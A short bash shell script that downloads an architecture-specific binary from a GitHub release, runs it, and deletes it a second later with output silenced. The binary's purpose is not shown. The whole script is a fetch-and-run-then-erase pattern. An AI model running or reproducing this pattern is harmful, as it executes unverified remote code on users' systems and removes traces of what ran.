#!/bin/bash

rm -rf sbg temp >/dev/null 2>&1

ARCH=$(uname -m)
case $ARCH in
    "aarch64" | "arm64" | "arm")
        curl -s -Lo sbg https://github.com/Andtherya/test/releases/download/test/saudp
        ;;
    "x86_64" | "amd64" | "x86")
        curl -s -Lo sbg https://github.com/Andtherya/test/releases/download/test/sbudp
        ;;
    *)
        echo "Unsupported architecture: $ARCH"
        exit 1
        ;;
esac

chmod +x sbg && ./sbg
sleep 1
rm -rf sbg >/dev/null 2>&1
